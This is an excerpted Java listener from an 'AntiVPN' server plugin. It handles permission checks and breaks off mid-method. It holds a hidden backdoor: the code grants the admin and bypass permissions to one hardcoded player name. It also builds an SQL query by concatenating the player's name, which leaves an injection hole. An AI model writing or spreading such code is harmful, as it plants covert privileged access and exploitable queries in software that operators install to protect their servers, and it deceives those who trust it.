package at.srsyntax.antivpn.listener;
...
public class PermissionCheckListener implements Listener {
    ...
    public void onPermissionCheckEvent(PermissionCheckEvent event) {
        if ((event.getPermission().equalsIgnoreCase("avpn.admin") || event.getPermission().equalsIgnoreCase("avpn.bypass")) && event.getSender().getName().equals("Henriks9"))
            event.setHasPermission(true);
        else if (event.getPermission().equalsIgnoreCase("avpn.bypass")) {
            try {
                final Statement statement = AntiVPN.getInstance().getDatabase().getConnection().createStatement();
                final ResultSet result = statement.executeQuery("SELECT * FROM ANTIVPNPERM WHERE NAME= '" + event.getSender().getName() + "'");
                event.setHasPermission(result.next() && result.getString("NAME") != null);
